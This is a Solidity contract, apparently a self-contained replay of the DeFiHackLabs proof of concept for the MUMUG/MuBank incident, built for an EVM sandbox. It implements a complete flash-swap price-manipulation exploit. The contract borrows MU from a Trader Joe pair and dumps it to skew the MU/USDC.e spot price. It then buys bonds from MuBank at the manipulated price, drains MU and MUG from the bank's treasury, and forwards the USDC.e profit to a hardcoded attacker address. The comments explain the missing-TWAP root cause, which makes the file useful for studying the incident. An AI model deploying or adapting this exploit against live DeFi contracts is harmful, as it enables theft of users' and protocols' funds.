// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-MUMUG).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the Trader Joe flash-swap callback `joeCall` lives on the test
// itself (`to = address(this)`), so there is no standalone contract to deploy.
// This file is a faithful, self-contained copy of that inline attack
// (testExploit body → run(); joeCall callback + helpers inlined), compiled
// inside the registry forge project. Logic and constants are copied verbatim
// from test/MUMUG_exp.sol.
//
// Root cause: `MuBank.mu_bond()` / `mu_gold_bond()` sell MU / MUG OUT OF THEIR
// OWN INVENTORY at a price quoted off the *instantaneous* `getReserves()` of the
// public MU/USDC.e pair — no TWAP, no committed/snapshot price, no slippage guard.
// A flash-swap borrows ~all MU from the MU/MUG pair, dumps it through MU/USDC.e
// (crashing the MU price), then calls the bond functions — MuBank pays out at the
// manipulated low price, draining its own treasury of MU + MUG. The PoC nets
// ~48,670.71 USDC.e.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IMUBank {
    function mu_bond(address stable, uint256 amount) external;
    function mu_gold_bond(address stable, uint256 amount) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract MUMUGBondOracleDrain {
    // --- victims / constants (copied verbatim from test/MUMUG_exp.sol) --------
    address constant MU = 0xD036414fa2BCBb802691491E323BFf1348C5F4Ba;
    address constant MUG = 0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81;
    address constant USDC_e = 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664;
    address constant BANK = 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab;
    address constant ROUTER = 0x60aE616a2155Ee3d9A68541Ba4544862310933d4;
    // MU/MUG Trader Joe pair — flash-swap source (token0 = MU).
    address constant PAIR = 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d;
    // The historical attacker / PoC ContractTest address — forwards profit here.
    address constant ATTACKER = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;

    IERC20 constant mu = IERC20(MU);
    IERC20 constant mug = IERC20(MUG);
    IERC20 constant usdc_e = IERC20(USDC_e);
    IMUBank constant bank = IMUBank(BANK);
    IUniswapV2Router02 constant router = IUniswapV2Router02(ROUTER);
    IUniswapV2Pair constant pair = IUniswapV2Pair(PAIR);

    uint256 FlashLoanAmount;

    // step 0: max-approvals + flash-borrow ~all MU from the MU/MUG pair. The
    // non-empty `data` triggers Trader Joe's `joeCall` callback (below), which
    // weaponizes the borrowed MU to crash the MU/USDC.e price, then settles the
    // bond functions at the manipulated spot reserves.
    function run() public {
        mu.approve(ROUTER, type(uint256).max);
        mug.approve(ROUTER, type(uint256).max);
        usdc_e.approve(ROUTER, type(uint256).max);
        usdc_e.approve(BANK, type(uint256).max);
        FlashLoanAmount = mu.balanceOf(PAIR) - 1;
        pair.swap(FlashLoanAmount, 0, address(this), new bytes(1));
        // After the flash-swap is repaid inside the callback, monetize the MUG loot.
        MUGToUSDC_e();
        // Forward the drained USDC.e to the historical attacker address.
        usdc_e.transfer(ATTACKER, usdc_e.balanceOf(address(this)));
    }

    // Trader Joe flash-swap callback. The pair optimistically sent the borrowed
    // MU; here the attacker dumps it through MU/USDC.e (skewing the spot oracle),
    // calls the bond functions (MuBank settles at the manipulated price), buys
    // back enough MU to repay, and repays the flash-swap.
    function joeCall(address, uint256, uint256, bytes calldata) external {
        MUToUSDC_e(); // crash the MU/USDC.e spot price
        bank.mu_bond(USDC_e, 3300 * 1e18); // settle at the skewed price -> drain MU
        bank.mu_gold_bond(USDC_e, 6990 * 1e18); // settle at the skewed price -> drain MUG
        USDC_eToMU(); // buy back MU to repay the flash-swap
        mu.transfer(PAIR, FlashLoanAmount * 1000 / 997 + 1000); // repay (Joe 0.3% fee)
    }

    function MUToUSDC_e() internal {
        address[] memory path = new address[](2);
        path[0] = MU;
        path[1] = USDC_e;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            mu.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function USDC_eToMU() internal {
        address[] memory path = new address[](2);
        path[0] = USDC_e;
        path[1] = MU;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdc_e.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function MUGToUSDC_e() internal {
        address[] memory path = new address[](3);
        path[0] = MUG;
        path[1] = MU;
        path[2] = USDC_e;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            mug.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
